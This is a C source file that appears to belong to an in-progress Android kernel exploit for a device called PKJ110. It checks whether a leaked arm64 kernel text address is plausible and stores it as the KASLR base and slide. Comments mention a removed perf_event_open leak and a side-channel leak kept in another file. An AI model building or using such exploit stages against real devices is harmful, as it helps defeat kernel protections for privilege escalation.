#include "common.h"

/*
 * KIMAGE base validation (was perf_leak.c).
 *
 * The perf_event_open IP-sampling leak was REMOVED 2026-08-19: on PKJ110
 * the shell domain has no CAP_PERFMON, so perf_event_open always returns
 * EACCES (proven in every run log, run183–189 — the code never once
 * succeeded). KASLR comes exclusively from the pselect/boot_id side
 * channel (slide.c). Only apply_kimage_base() remains: it validates and
 * commits a leaked text base into kaslr_base/slide.
 */

/*
 * Runtime kernel image VA class on arm64 Android is not always 0xffffffc0…
 * (vmlinux static base). PKJ110 live _stext is 0xffffffe5f8410000-class.
 * Reject linear map (0xffffff80…) which has no KASLR text entropy.
 */
static int is_runtime_kimage_base(uint64_t text_base) {
  if ((text_base >> 48) != 0xffff) {
    return 0;
  }
  /* Physmap / PAGE_OFFSET linear map */
  if ((text_base & 0xfffffff000000000ULL) == 0xffffff8000000000ULL) {
    return 0;
  }
  /* Prefer 2MiB alignment (text bases usually are) */
  if (text_base & 0x1fffffULL) {
    return 0;
  }
  return 1;
}

int apply_kimage_base(uint64_t text_base) {
  if (!is_runtime_kimage_base(text_base)) {
    pr_warning("apply_kimage_base reject base=%016llx (not runtime kimage class)\n",
               (unsigned long long)text_base);
    return 0;
  }
  kaslr_base = text_base;
  kaslr_slide = text_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  pr_info("slide-kaslr-ok pid=%d base=%016llx slide=%016llx (source=apply)\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  return 1;
}
